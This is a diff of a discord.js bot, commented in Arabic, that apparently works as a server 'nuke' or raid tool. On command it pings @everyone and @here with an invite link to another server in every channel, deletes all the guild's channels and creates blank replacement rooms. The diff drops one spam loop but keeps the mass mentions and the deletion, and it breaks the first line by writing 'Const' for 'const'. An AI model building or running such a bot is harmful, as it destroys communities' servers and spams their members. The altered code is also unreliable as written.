@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
+Const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
@@ -8,8 +8,8 @@ const client = new Client({
     ]
 });
 
-const PREFIX = '!'; // البرفكس
-const TARGET_SERVER_LINK = 'https://discord.gg/kzRnSxGKkX'; // رابط السيرفر المستهدف
+const PREFIX = '!'; // ضع البرفكس الخاص بك هنا
+const TARGET_SERVER_LINK = 'https://discord.gg/kzRnSxGKkX'; // رابط السيرفر الخاص بك
 
 client.on('ready', () => {
     console.log(`Logged in as ${client.user.tag}!`);
@@ -33,7 +33,7 @@ client.on('messageCreate', async message => {
             }
         }, 5 * 60 * 1000);
 
-        // 2. إرسال الرابط في الرومات العامة الموجودة مسبقاً مع @everyone و @here
+        // 2. إرسال الرابط في الرومات العامة مع @everyone و @here
         guild.channels.cache.forEach(async channel => {
             if (channel.isTextBased() && channel.permissionsFor(guild.members.me).has(PermissionsBitField.Flags.SendMessages)) {
                 try {
@@ -51,25 +51,18 @@ client.on('messageCreate', async message => {
             for (const [id, channel] of guild.channels.cache) {
                 try {
                     await channel.delete();
-                    await delay(500); 
+                    await delay(500); // سرعة مضاعفة
                 } catch (e) {}
             }
 
-            // إنشاء رومات جديدة وإرسال الرسالة فيها 8 مرات
+            // إنشاء رومات جديدة
             for (let i = 1; i <= 5; i++) {
                 try {
-                    const newChannel = await guild.channels.create({
+                    await guild.channels.create({
                         name: `room-${i}`,
                         type: 0 // GuildText
                     });
                     await delay(1000);
-
-                    // تكرار إرسال الرسالة 8 مرات في الروم المنشأ حديثاً
-                    for (let j = 1; j <= 8; j++) {
-                        await newChannel.send(`@everyone @here\nرسالة تعليمية (${j}/8):\n${TARGET_SERVER_LINK}`);
-                        // تأخير قصير جداً بين الرسائل المتتالية لتجنب الـ Rate Limit
-                        await delay(300); 
-                    }
                 } catch (e) {}
             }
         })();
